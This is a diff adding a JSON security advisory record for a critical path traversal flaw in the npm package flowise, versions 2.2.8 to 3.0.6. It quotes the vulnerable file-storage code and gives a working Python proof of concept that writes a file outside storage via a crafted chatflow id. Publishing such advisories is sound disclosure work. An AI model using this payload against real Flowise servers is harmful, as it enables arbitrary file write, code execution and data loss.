@@ -1,0 +1,66 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/09/GHSA-q67q-549q-p849/GHSA-q67q-549q-p849.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "flowise",
+        "purl": "pkg:npm/flowise"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "2.2.8"
+            },
+            {
+              "fixed": "3.0.6"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-09-15T20:11:39Z",
+    "nvd_published_at": null,
+    "severity": "CRITICAL"
+  },
+  "details": "### Summary\n\nMissing chat flow id validation allows an attacker to access arbitrary file.\n\n### Details\n\nCommit https://github.com/FlowiseAI/Flowise/commit/8bd3de41533de78e4ef6c980e5704a1f9cb7ae6f and https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7 added check for `filename` when handling file upload operations to prevent path traversal, and additional validation of `chatflowId` and `chatId` from route `/api/v1/attachments`. In some cases, however,  `chatflowId` and `chatId` are not validated to ensure they are UUIDs or numbers, which may lead to security issues.\n\n**Case 1**\n\nWhen creating new chatflow via `/api/v1/chatflows`, function `addBase64FilesToStorage` is called if there exists base64 file data. Although the `filename` is sanitized, the `chatflowid` comes from request body directly without any validation. An attacker could exploit the path traversal here to write arbitrary file with controlled data.\n\n```typescript\nexport const addBase64FilesToStorage = async (fileBase64: string, chatflowid: string, fileNames: string[]) => {\n    // ...\n    } else {\n        const dir = path.join(getStoragePath(), chatflowid)  // path traversal here\n        if (!fs.existsSync(dir)) {\n            fs.mkdirSync(dir, { recursive: true })\n        }\n\n        const splitDataURI = fileBase64.split(',')\n        const filename = splitDataURI.pop()?.split(':')[1] ?? ''\n        const bf = Buffer.from(splitDataURI.pop() || '', 'base64')\n        const sanitizedFilename = _sanitizeFilename(filename)\n\n        const filePath = path.join(dir, sanitizedFilename)\n        fs.writeFileSync(filePath, bf)\n        fileNames.push(sanitizedFilename)\n        return 'FILE-STORAGE::' + JSON.stringify(fileNames)\n    }\n}\n```\n\n**Case 2**\n\nWhen downloading file via `/api/v1/openai-assistants-file/download` or `/api/v1/get-upload-file`, function `streamStorageFile` is called to retrieve file data from local or cloud bucket. The `chatflowId` and `chatId` are used for file path generation. Take Amazon S3 as an example, its [[documentation indicates](https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-keys.html#object-key-guidelines)](https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-keys.html#object-key-guidelines) that `../` will be treated as relative path.\n\nNote that these APIs are in `WHITELIST_URLS`, an attacker may traverse user storage files without authentication.\n\n### PoC\n\nLaunch app at localhost with default config, then run the following python script, a file named 'pwn' will be written to dir `/tmp` with content 'Hello, World!'.\n\n```python\nimport requests\nimport json\nurl = \"http://localhost:8080/api/v1/chatflows\"\nheaders = {\"x-request-from\": \"internal\"}\nnodedata = {\n  \"category\" : \"Document Loaders\",\n  \"inputs\" : {\n    \"key\" : \"data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==,a:pwn\"\n  }\n}\nflownode = {\n  \"id\" : \"a\",\n  \"data\" : nodedata\n}\nflowdata = {\n  \"nodes\" : [flownode],\n  \"edges\" : [],\n  \"viewport\" : {\n    \"x\" : 1,\n    \"y\" : 1,\n    \"zoom\" : 1\n  }\n}\ndata = {\n  \"id\" : \"../../../../../tmp\",\n  \"name\" : \"name\",\n  \"flowData\" : json.dumps(flowdata)\n}\nres = requests.post(url, json=data, headers=headers)\n```\n\n### Impact\n\n1. Arbitrary file read / write\n2. Remote Code Execution\n3. Data loss",
+  "id": "GHSA-q67q-549q-p849",
+  "modified": "2025-09-15T20:11:39Z",
+  "published": "2025-09-15T20:11:39Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-q67q-549q-p849"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/FlowiseAI/Flowise/commit/8bd3de41533de78e4ef6c980e5704a1f9cb7ae6f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/FlowiseAI/Flowise/commit/c2b830f279e454e8b758da441016b2234f220ac7"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/FlowiseAI/Flowise"
+    }
+  ],
+  "schema_version": "1.7.3",
+  "severity": [
+    {
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
+    }
+  ],
+  "summary": "Flowise has arbitrary file access due to missing chat flow id validation"
+}
